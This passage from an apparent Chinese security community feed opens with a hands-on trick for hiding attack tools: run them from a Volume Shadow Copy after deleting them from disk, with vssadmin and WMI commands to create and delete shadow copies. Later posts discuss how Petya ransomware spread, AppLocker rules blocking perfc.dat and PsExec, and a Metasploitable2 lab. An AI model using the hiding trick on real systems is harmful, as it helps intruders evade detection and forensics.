3.查看一下我们创建的VSS的DeviceObject（如果使用vssadmin创建的，返回结果里就会有）：
gwmi Win32_ShadowCopy | select -Property DeviceObject
返回结果为：
DeviceObject                                   
------------                                   
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8
4.将\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8中的“？”换成“.”，就可以执行你的程序了：
\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\test\hunter64.exe

是不是很简单？这样做，实际硬盘上已经看不到hunter64.exe里，但是我们做了一个shadow copy，在这里shadow copy里，我们的程序还在，通过这种方式我们就可以随时随地执行我们的“影子”程序，从而实现隐藏我们的工具了。
等你不再需要这些工具的时候，直接删除你创建的VSS就可以了：
vssadmin Delete Shadows /shadow={eeb50055-34c9-472b-81e6-ed111742e12e} /quiet
或者
Get-WmiObject Win32_ShadowCopy | where {$_.ID -eq '{eeb50055-34c9-472b-81e6-ed111742e12e}'} | Remove-WmiObject
当然，使用WMI的方法我们不一定用powershell，也可以使用JScript或者VBScript，比如：
var Win32_ShadowCopy =GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_ShadowCopy");
Win32_ShadowCopy.Create(
  "C:\\",
  "ClientAccessible"
);

举一反三的机会留给各位圈友了：-）

<img src="https://images.xiaomiquan.com/Fr3g-bDh6ZEsWgeuedBGC3XRbq_l?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jyHrhJEjosuVJuUmtjKlF2ifYJ8=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FmT7oZ79Jbh44M3auMEbhYRfsx-s?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:psLIgsGpbh9aywxarRAauuzLBrg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FvuN5GgkqCVU3yGgpSi-sakrbYqM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Cn4mcNhkPIcPKRk7lHitjUohHHQ=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrColQQRXcJjgEsM9G6YkaFzogxe?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nw9K-O-Y6Ga6UEfxIhipq9WYG7g=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fksg794N47n3RgzNFwYSbDDVA1jv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PJ_hAwIodO4J7VvaUZcAL7gfZFA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/45/79/4579de34e8ec11021f8b7bdfe0a39c2cd2548b177fe81fb27cc6b3ad1fb10d84.jpg" width="25px"/> __荣__: 学习了

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: power shell和cmd的区别都没有明白，你这个好厉害

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 老司机😄

<img src="https://file.xiaomiquan.com/26/79/267912333e3a10e722bafe6d175ef1ff78a1acf5b225a78b77ce0dc5526aae87.jpg" width="25px"/> __Bruce__: 一言不合就开车

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这里有份朋友写的指南也可以参考：
[pentest-wiki/How-to-use-vssadmin.md at master · ni...](https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-use-vssadmin.md)



<img src="https://file.xiaomiquan.com/5c/5b/5c5bd5fd5bc43252edf22334cf0f4413840926443bd701d15a0beb35d87ff163.jpg" width="25px"/> __Mr.N__: DMZlab那个是怎么了？不见了？


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-06-28:

玩黑手的大伙儿估计都知道nethunter，很不错的黑手套装，只是有些机型比较难刷。今天推一个不一样的黑手玩法：How about a complete Linux on your phone?

Linuxdeploy(play商店有下)能够在root过的安卓手机上安装完整Linux系统，目前支持的发行版有Debian, Ubuntu, Kali Linux, Arch Linux, Fedora, CentOS, Gentoo, openSUSE, Slackware, RootFS 
功能非常之强大，还支持好几种GUI，更多功能有待大家慢慢把玩

Play商店下载地址
[https://play.google.com/store/apps/details?id=ru.m...](https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy)



另外，linuxdeploy还是开源的！

[GitHub - meefik/linuxdeploy: Install and run GNU/L...](https://github.com/meefik/linuxdeploy)



有的同学可能会觉得手机上键盘是个痛点，没关系我们有hacker keyboard

[https://play.google.com/store/apps/details?id=org....](https://play.google.com/store/apps/details?id=org.pocketworkstation.pckeyboard)




What you can do on Linux, you can do the same on your PHONE

<img src="https://images.xiaomiquan.com/FmquZZWgZvzfY2fLJ_thKf6q6ViE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ef1vBeGiGMuP6yZL7GL_xOsWYK4=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FiIojwNo0_ehijjifjOMjddpRrLi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:gFWPK2hQHtn_DnSZemaTZ6_hvtM=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个不错，低成本😄

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 在不能用电脑的时候。。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  卡巴斯基这篇分析不错：


[Schroedinger's Pet(ya) - Securelist](https://securelist.com/schroedingers-petya/78870/)

 

最关键是点名了 139、445 这两个端口，上下文可以知道为什么是这两个端口。

报告昨天的:-)



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 附微软的报告：
[New ransomware, old techniques: Petya adds worm ca...](https://blogs.technet.microsoft.com/mmpc/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  从 Mcafee 的分析报告来看，全球这个感染统计，中国有（但还没听说哪家被感染的消息），好多国家都没？当然这和 Mcafee 全球安装情况有关。


[Problem loading page](https://securingtomorrow.mcafee.com/mcafee-labs/new-variant-petya-ransomware-spreading-like-wildfire/)



<img src="https://images.xiaomiquan.com/FgWG4Gz1o6m7XTxdnylM4xUrmQ8y?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:y3s_Z2vvBpFmPxjdUDWzOzjsSnM=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  从 Mcafee 的分析报告来看，全球这个感染统计，中国有（但还没听说哪家被感染的消息），好多国家都没？当然这和 Mcafee 全球安装情况有关。


[Problem loading page](https://securingtomorrow.mcafee.com/mcafee-labs/new-variant-petya-ransomware-spreading-like-wildfire/)



<img src="https://images.xiaomiquan.com/FgWG4Gz1o6m7XTxdnylM4xUrmQ8y?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:y3s_Z2vvBpFmPxjdUDWzOzjsSnM=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  什么垃圾解决方案，先搞懂 135、139、445 端口的区别，为什么之前封禁 445，现在为什么要应对 139，本质原因哪家分析清楚了？135 为什么要动？

一些偷懒粗暴防御真会害死人，以前看那些扫描器的报告里的防御部分，千篇一律，垃圾。



...

<img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__: 我认为病毒还是对漏洞的ms17010的使用，而ms17010是基于这几个端口的

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__: 还有继续思考下

<img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 135适用于远程方便入侵，139  445端口都可以在局域网方便传染病毒

<img src="https://file.xiaomiquan.com/0a/77/0a779376ed0171ed1b0d4d32b04cfbd349dae7b0bd421f8194ceb0c753f0fcd1.jpg" width="25px"/> __测试测试__: 有一篇讲 445很139端口区别：
[networking - Difference between NetBIOS and SMB - ...](https://superuser.com/questions/694469/difference-between-netbios-and-smb)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  终于看到一篇能把内网感染的细节过程描述比较清晰的分析报告了。


[Petya Ransomware Without The Fluff - Binary Defens...](https://www.binarydefense.com/petya-ransomware-without-fluff/)

 

过程用到 Mimikatz 相关技巧提取明文密码、PSEXEC、WMIC 的利用技巧。

<img src="https://images.xiaomiquan.com/FvzOxvclLhFGKnwV0gHYHeLnlghd?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-h-9hpdseGHrO-NmDh5_r_hpMHs=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FuIfKWz7Va5GoxVQUjgvUEIJOeFT?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:QeJ9BGGZWKplOesfI8UJHkhu81Q=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FjtVwUNx_h_1u60Ud5jhptFADTcR?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:SgGQ_l6h9l2W4uX7rkUSbZbot7Q=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/0a/77/0a779376ed0171ed1b0d4d32b04cfbd349dae7b0bd421f8194ceb0c753f0fcd1.jpg" width="25px"/> __测试测试__: perfc.dat 传播时候用了远端的139端口


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  防御建议：使用 Windows 操作系统自带的 AppLocker（应用锁定）功能，拦截任何文件名包含 perfc.dat 的文件执行，同时还要拦截 Sysinternals Suite 中的 PsExec.exe 工具的启用，前面说了蠕虫在内网用到了这个来传播。

这里说下为什么屏蔽 perfc.dat 文件，Petya 蠕虫植入的其中一步就是本地写入：

C:\Windows\perfc.dat

并执行之，屏蔽这个可以阻止之后的感染，这个算是一种本地的“KILL SWITCH”（阻止开关）。



...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: PowerScript 防御脚本(未验证):

[$extensions = "", ".dat", ".dll" $baseFileName = "...](https://pastebin.com/BxZ8CEzc)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 看代码应该没问题

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 当然最关键的防御还有一个就是之前没打 MS-17010 补丁的，打上...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个 stop-petya.bat 脚本以管理员权限去运行：
[https://gist.github.com/ujeenator/461a68816938c7f4...](https://gist.github.com/ujeenator/461a68816938c7f4010a535ec47b3199)



可以阻止这个蠕虫的感染。

<img src="https://file.xiaomiquan.com/7d/22/7d22de0d89f5eee63f931b7ee84a3b8ea7fd48312453571b6e89a7b827d4e526.jpg" width="25px"/> __Langley__: Win 10下有appLocker?没找到

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/7d/22/7d22de0d89f5eee63f931b7ee84a3b8ea7fd48312453571b6e89a7b827d4e526.jpg" width="25px"/> __Langley__: 百度下


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  有传闻这个蠕虫的传播和前段时间的 Word 0day 有关（CVE-2017-0199），Cylance 这家安全公司的分析结论是：无关。


[https://www.cylance.com/en_us/blog/cylance-prevent...](https://www.cylance.com/en_us/blog/cylance-prevents-petya-like-ransomware.html)



<img src="https://images.xiaomiquan.com/Fg1aSJMBO43ozFlIARZY2nza6LoI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:fvjOLpU4Nxi7zC9kHE_24TiN99I=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  蠕虫样本分析各家应该加强两点，只是建议啊：1. 加密解密的清晰流程；2. 内网渗透部分的技巧，恐怕这块需要这方面职业人士才能一眼道破了...

什么系统、文件、注册表、网络等行为这个各家分析都很成熟，真的挑战职业的至少包括上述两点。

补充：

还有第3点：清晰靠谱的解决方案，像关闭 445 这么粗暴的就不用再提了...企业内网架构里，你说关就关啊



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 本圈紧密关注这次 Petya 蠕虫事件，挺有意思的，我会及时同步一些情报进来。

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 比较全的#Petya#信息:
[https://gist.github.com/vulnersCom](https://gist.github.com/vulnersCom)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 酷


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  怪不得内网感染那么凶？通过 WMIC、PSEXEC 这些经典内网渗透技巧来传播感染内网...即使内网那些机器补丁了之前的补丁(WannaCry 的 MS- 17010)也没用

<img src="https://images.xiaomiquan.com/FgnO9E-NSnxwTIZ669Wwq2EBWRmF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:yRyW7mwEVquJ9XgkS_lgwYACBTc=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-28:


__#Petya#__

  厉害厉害，蠕虫传播会这样加强的，这次 Petya 还是老方式

<img src="https://images.xiaomiquan.com/FqGGq5Gc4xBJ5LggtzPlva6a-EdH?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:rJAvFUfme2O5tn_Dm-93YpPZCQc=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 感觉英语不好就玩不成了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-27:

> Aodongq1n 提问：
玄哥，圈子运营也有一段时间了，感觉干货确实不少，但是自己这方面跟不上你的节奏，往往一个东西分享出来了，但是自己要琢磨好几天，特别是最近又有了一些人来分享，这种跟不上的情况，想毕是很多人都存在的，不知道玄哥这方面能不能指点下，谢谢了


当年我刚入门这行买了本黑客防线，硬是两周时间不断啃里面的每篇文章，刚开始一头雾水，但是我自我安慰：至少我先把里面提到的术语保持个印象吧。

慢慢的就啃下了。

你看看本圈才开了多久？对于新人来说，哪有那么快就能跟上节奏？脚踏实地一步一步能跟多少看自己的努力。技能太多，也需要自己聚焦下，比如有嘉宾准备分享 Python 在安全方面的玩法，如果感兴趣可以先聚焦这个，而其他的了解下知道有这玩意就行，回头再回顾。

相信我，当你问出这个困惑时，离突破也不远了。再特别提醒下：

1. 把自己的业余时间充分用好；
2. 参与必要的交流互动，这样可以加深印象。



...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 充分的去理解“啃”这个字，把自己每个不懂的术语去百度，然后一行一行的理解，或者是从一篇文章中去分析，需要什么样的知识储备，才能看得懂，并能理解文章，然后自己去补充这些知识，这些知识不需要很精通，可以仅限你能看得懂分享就好，当然安全的分类下去，含盖面太广了，那就自己选择一条主线，沿着这条主线去走。一路走下去会扩充你很多知识面，并能带来一些成就感，就知道下面的路怎么走了。

<img src="https://file.xiaomiquan.com/69/06/6906ae93875b4c665752597faa63093862c424e4ddd841064d7ca6327827f840.jpg" width="25px"/> __Ю° ゜• .__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 说得真棒

<img src="https://file.xiaomiquan.com/59/46/59463c74099a7966bc6585d6104782f670abc10a7536be9c3f9dc22f49d361de.jpg" width="25px"/> __H3ro__: 或许兴趣是最好的导师

<img src="https://file.xiaomiquan.com/03/19/0319642214212478cc7a772009e69b09094a6322e3d2d416c26d8086f132833a.jpg" width="25px"/> __逗逼师父__: 我也是有同样的困惑，受教了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-27:


__#资源#__

 重磅推荐，黑客报告 2017！

这篇报告从茄牛的分享里看到的，这里也推荐给大家，这篇报告确实是一份难得的“非常规网络安全报告”，攻击者视角与防御者视角做得不错，很多数字与观点值得深入琢磨。

无论你是攻还是防，这篇报告都值得你的仔细阅读。

感谢输出报告的公司及译者公司。

<img src="https://images.xiaomiquan.com/FgWUyrsgx_9Me4CYYslj2uRGgimF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:fIObhRh0Ldvo2ozk3aWsOyTDZOw=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FnOoKbrDQwci7KLouKcprUjZVhzx?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PUjWb19auwxE-ijNLmb8atqNK7w=" width="50%" height="50%" align="middle"/>

__分享文件:__
[黑客报告2017.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-06-26:


__#资源#__

  MSF入门练习平台

了解并使用VMware搭建Metasploitable2。 Metasploitable2 是Metasploit团队维护的一个集成了各种漏洞弱点的Linux主机(ubuntu)镜像,方便广大黑扩跟安全人员进行MSF漏洞测试跟学习,免去搭建各种测试环境。 VMware: 直接打开Metasploitable.vmdk即可使用 登陆账号密码：msfadmin msfadmin

Metasploitable2下载地址:

[Metasploitable - Browse /Metasploitable2 at Source...](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)



注：目前Metasploitable3也早就发布了，而且环境更贴近实战，不过Metasploitable2更适合MSF入门学习。
[Metasploitable 3正式发布，附赠全球CTF大赛 - FreeBuf.COM | 关注黑...](http://www.freebuf.com/news/122341.html)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个经验好！

<img src="https://file.xiaomiquan.com/97/47/974750d84f30b2b0bee06ac29107f8adbb3e028b3111605175e68bfa1ceadd35.jpg" width="25px"/> __hkurj__: 赞

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 从入门开始  一点一点来

<img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 赞


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-06-25:


__#姿势#__

 
__#python#__

 
今天我来给大家科普科普python当中socket的使用。socket可以说是网络安全编程领域当中，用的最广泛的库了。只要涉及到网络应用层，除非是web，不然都逃不开socket。所以今天我就来为大家介绍介绍socket的使用。


[python中socket模块的使用 | D_infinite的小站](http://dinfinite.cn/2017/06/25/python%E4%B8%ADsocket%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/)



以后，我会带来一系列跟python有关的分享。如果有什么问题或者建议的，欢迎在评论区留言指教。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Python 必掌握技能点 socket

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不熟悉的，推荐大家跟上

<img src="https://file.xiaomiquan.com/d6/55/d6558b36cc52dd14bcae9f9a3ff02b7d980de0df97e5fef93bfdc01b1037dcd7.jpg" width="25px"/> __F0rever__: 就喜欢关于python的😄

<img src="https://file.xiaomiquan.com/f9/27/f9276c3310bd204578128880956578c0cf386036e48ad7688d672c9ee1d4fc81.jpg" width="25px"/> __Alummox💋bbm__: 正在学习中，雪中送炭啊

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 这篇真干货。

<img src="https://file.xiaomiquan.com/80/c3/80c3a6e8cc93c7e3dbf226a5b6a14ff7c5ad6da0fbda3b51939c7efec01bbcb3.jpg" width="25px"/> __😍😡-ToSimp__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 您好，请教个问题，对于新手，学习这方面，有什么比较好的书推荐一下么， 另外现在不是大数据特别火吗，我想问问这块的安全应该从哪里入手？

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 请问大神，关于http请求的库最喜欢或者最推荐哪个？为啥？

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: requests

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 👍

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 点赞的肯定都是新手，菜鸟


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-25:

XSS'OR - Hack with JavaScript 开源！

采用 BSD 开源协议，很宽松，不限制传播与商业化，留下作者版权就好。


[GitHub - evilcos/xssor2: XSS'OR - Hack with JavaSc...](https://github.com/evilcos/xssor2)



简单说明下：

上线之后（xssor.io），使用频率还不错。源码是 Python 及 JavaScript，采用了 Django、Bootstrap、jQuery 三个优秀框架，可以完整覆盖前后端，基于这三个框架，开发速度非常的快，整个过程消耗我不到一周时间，其中一半耗时在软件设计上。感兴趣这个过程的，可以读这套源码，很简洁，在开发过程中我特意去掉数据库（因为我觉得我这个应用场景其实不需要数据库）。

既然开源了，后续应该会和新组建的 ATToT 安全团队一起去完善它。

有任何问题，欢迎联系我。



...

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__: 🍺🍺

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 这个是攻击平台吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: xssor.io 玩玩就知道

